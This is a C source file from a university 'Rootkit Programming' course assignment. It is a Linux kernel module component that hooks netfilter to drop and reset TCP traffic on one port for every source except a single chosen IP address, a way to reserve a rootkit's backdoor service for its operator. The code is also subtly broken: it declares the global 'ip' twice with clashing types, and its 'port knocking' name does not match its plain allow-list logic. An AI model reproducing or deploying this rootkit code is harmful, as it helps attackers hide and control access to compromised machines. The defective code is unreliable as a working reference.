
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 10                                                            */
/*                                                                             */
/*   Filename: port_knocking.c                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: January 2016                                                        */
/*                                                                             */
/*   Usage: ...                                                                */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>					/* Needed by all kernel modules */
#include <linux/inet.h>						/* Needed for in4_pton */
#include <linux/netfilter_ipv4.h>			/* Needed for NF_IP_PRI_FIRST */
#include <net/netfilter/ipv4/nf_reject.h>	/* Needed for nf_send_reset */


/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define PRINT(str) printk(KERN_INFO "rootkit port_knocking: %s\n", (str))
#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)


/* Definition of global variables */
static int show_debug_messages;
static unsigned int ip;   /* The IPv4 address which is allowed to connect */
static int port;

static __u32 ip;   /* The binary representation of the IPv4 address which is allowed to connect */


/* Declaration of data structs */
static struct nf_hook_ops hook;


/* Declaration of functions */
int port_knocking_init(int, char *, int);
int port_knocking_exit(void);

static int load_port_knocking(void);
static unsigned int knocking_hook (const struct nf_hook_ops *, struct sk_buff *,
	const struct net_device *, const struct net_device *, int (*okfn)(struct sk_buff *));
static int should_block_packet(struct sk_buff *);


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


int port_knocking_init(int debug_mode_on, char *pk_ip, int pk_port)
{
	u8 tmp[4];
	int ret;

	show_debug_messages = debug_mode_on;

	/* Verify that given IPv4 address is valid */
	if (!in4_pton(pk_ip, -1, tmp, -1, NULL)) {
		DEBUG_PRINT("[Error] invalid IP address given as argument");

		return -EINVAL;
	}

	/* Convert byte array to __u32 */
	ip = 0;
	ip |= tmp[0] & 0xFF;
	ip <<= 8;
	ip |= tmp[1] & 0xFF;
	ip <<= 8;
	ip |= tmp[2] & 0xFF;
	ip <<= 8;
	ip |= tmp[3] & 0xFF;

	if (pk_port < 0 || 65535 < pk_port) {
		DEBUG_PRINT("[Error] missing or invalid port number given as argument");

		return -EINVAL;
	}
	port = pk_port;

	ret = load_port_knocking();
	if (ret < 0)
		return ret;

	DEBUG_PRINT("initialized");

	return 0;
}


int port_knocking_exit(void)
{
	nf_unregister_hook(&hook);

	DEBUG_PRINT("exited");

	return 0;
}


/* Enable the port knocking mechanism */
static int load_port_knocking(void)
{
	int ret;

	/* Setup everything for the netfilter hook */
	hook.hook = knocking_hook;			/* our function */
	hook.hooknum = NF_INET_LOCAL_IN;	/* grab everything that comes in */
	hook.pf = PF_INET;					/* we only care about ipv4 */
	hook.priority = NF_IP_PRI_FIRST;	/* respect my priority */

	ret = nf_register_hook(&hook);

	if (ret < 0) {
		printk(KERN_INFO "rootkit port_knocking: [Error] nf_register_hook failed (nf_register_hook return value = %d)\n", ret);

		return ret;
	}

	return 0;
}


/* The Netfilter hook function. It is of type nf_hookfn (see netfilter.h). */
static unsigned int knocking_hook(const struct nf_hook_ops *ops, struct sk_buff *skb,
	const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	struct iphdr *ip_header;

	ip_header = (struct iphdr *) skb_network_header(skb);

	/* Let the packet through, if we not need to block it */
	if (!should_block_packet(skb))
		return NF_ACCEPT;

	/* Send TCP RST if protocol is TCP */
	if (ip_header->protocol == 6)
		nf_send_reset(skb, ops->hooknum);

	/* Safely drop the packet */
	DEBUG_PRINT("dropping a packet");

	return NF_DROP;
}


static int should_block_packet(struct sk_buff *skb)
{
	struct iphdr *ip_header;
	struct tcphdr *tcp_header;

	ip_header = (struct iphdr *) skb_network_header(skb);

	/* If this IP packet does not contain a TCP packet, allow packet to pass */
	if (ip_header->protocol != 6)
		return 0;

	/* Extract the TCP header */
	tcp_header = (struct tcphdr *) skb_transport_header(skb);

	/* If the port does not match the target port, allow packet to pass */
	if (ntohs(tcp_header->dest) != port)
		return 0;

	/* If the sender IP does not match the target IP, allow packet to pass */
	if (ntohl(ip_header->saddr) == ip) // or ip_header->saddr == masked_ip_addr
		return 0;

	/* Otherwise, reject the packet */
	printk(KERN_INFO "port_knocker: received packet on filtered TCP "
					 "port %u from IP %pI4.\n", port, &ip_header->saddr);
	return 1;
}
